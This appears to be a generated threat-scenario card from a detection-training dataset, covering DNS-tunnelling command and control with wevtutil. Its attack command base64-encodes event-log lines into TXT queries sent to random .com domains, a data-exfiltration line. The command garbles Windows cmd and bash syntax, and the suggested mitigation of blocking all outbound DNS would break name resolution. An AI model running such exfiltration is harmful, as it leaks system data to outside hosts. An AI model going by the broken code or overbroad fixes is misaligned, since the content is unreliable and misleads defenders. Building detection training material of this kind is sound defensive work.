---
type: campaign
scenario_id: 400
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using wevtutil to encode event log data in DNS TXT queries for C2.

## Threat Description
Using wevtutil to encode event log data in DNS TXT queries for C2.

## Attack Command
```
wevtutil qe System /q:"*[System[(EventID=4688)]]" /f:text | findstr nslookup | for /f "tokens=*" %i in ('more') do nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo %i | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor wevtutil DNS: `wmic process where name='wevtutil.exe' get commandline | findstr nslookup`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.

## Mitigation
Restrict wevtutil: `icacls %windir%\System32\wevtutil.exe /deny Everyone:RX`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect wevtutil-based DNS tunneling by analyzing event log queries, base64-encoded TXT subdomains, and DNS traffic patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
